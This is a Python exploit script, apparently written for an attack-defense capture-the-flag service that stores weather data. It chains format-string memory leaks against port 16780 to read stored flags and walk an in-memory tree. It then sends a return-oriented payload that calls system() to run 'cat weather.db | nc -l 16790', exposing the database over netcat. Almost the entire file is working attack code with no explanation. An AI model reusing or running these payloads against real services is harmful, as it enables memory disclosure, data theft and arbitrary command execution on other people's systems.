#!/usr/bin/env python3

import sys
import socket
import struct
import string


def exploit(data, target, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((target, port))

	s.send(data)
	response = s.recv(1024 * 10)

	s.close()

	return response

def hack_tpl_last(target):
	request = b'/ ' + 1022 * b'a' + b'%08x ' * 38 + b'%08x' + b'\x00'

	response = exploit(request, target, 16780)

	print(response)

	last_vals_addr_base = int(response.split(b' ')[-1], 16)

	for i in range(6):
		last_vals_addr = struct.pack("I", last_vals_addr_base + 4 * i)

		request = b'/ ' + 1022 * b'a' + last_vals_addr + b'%08x ' * 54 + b'%s' + b'\x00'

		print(exploit(request, target, 16780))
		input()

		flag_addr = exploit(request, target, 16780)[526:530]

		request = b'/ ' + 1022 * b'a' + flag_addr + b'%08x ' * 54 + b'%s' + b'\x00'

		response = exploit(request, target, 16780)

		print(response[526:].decode('ascii'))

def hack_tpl_all(target):

	#make clear weather
	for i in range(6):
		key = b'hakkhakkhak' + string.ascii_lowercase[i].encode('ascii')
		value = b'\x00' * 32

		request = b'\x01\x00\x00\x00' + key + value

		exploit(request, target, 16761)


	request = b'/ ' + 1022 * b'a' + b'%08x ' * 5 + b'%08x' + b'\x00'

	response = exploit(request, target, 16780)

	clear_base = int(response.split(b' ')[-1], 16)

	input()

	#                          root addr    clear addr
	root_base = clear_base + (0x0804F540 - 0x0804AA94)

	queue = []

	for i in range(26):
		request = b'/ ' + 1022 * b'a' + struct.pack("I", root_base + i * 4) + b'%08x ' * 58 + b'%s' + b'\x00'

		addr = exploit(request, target, 16780)[526:530]

		if (len(addr) < 4):
			continue

		queue.append((struct.unpack("I", addr)[0], 1, i))

	print(queue)
	input()

	while queue:
		item, queue = queue[0], queue[1:]

		for i in range(26):
			addr = item[0] + i * 4

			if addr & 0xff == 0:
				continue

			request = b'/ ' + 1022 * b'a' + struct.pack("I", addr) + b'%08x ' * 58 + b'%s' + b'\x00'

			value = exploit(request, target, 16780)

			if item[1] == 12:
				print(value[526:].decode('ascii'))
				break

			addr = value[526:530]

			if (len(addr) < 4):
				continue

			val = struct.unpack("I", addr)[0]
			#print("proceed %s + %s" % ('_' * (item[1] - 1) + string.ascii_lowercase[item[2]], string.ascii_lowercase[i]))

			queue.append((val, item[1] + 1, i))

def fucktorize(n):
	q = int(n)
	acc = 0
	l = []
	while True:
		for i in range(2, 10):
			while q % i == 0:
				if acc > 0:
					l.append(('+', acc))
					acc = 0
				q /= i
				l.append(('*', i))
		if q == 1:
			break
		q -= 1
		acc += 1
	return list(reversed(l))


def hack_rop(target):
	data = b'cat weather.db | nc -l 16790; #/'
	

	system_addr = 0xf77c0d92 # can be detected through format string, won't write it
	data_addr = 0xf77c4100

	actions2 = fucktorize(data_addr)
	actions1 = fucktorize(system_addr - len(actions2))

	for e in actions1:
		if e[0] == '+':
			c = bytes((0x100 - e[1], ))
		else:
			c = bytes((e[1], ))

		data += b'a' * 13 + c + b'b\x08' + b'a' * 16 # large value to make zero in second register

	data += b'a' * 13 + b'\xffb\xff' + c + b'a' * 16

	for e in actions2:
		if e[0] == '+':
			c = bytes((0x100 - e[1], ))
		else:
			c = bytes((e[1], ))

		data += b'a' * 13 + b'\xffb' + c + b'a' * 16

	data += b' '

	exploit(data, target, 16780)


methods = [hack_tpl_last, hack_tpl_all, hack_rop]

method, target = sys.argv[1:]

methods[int(method)](target)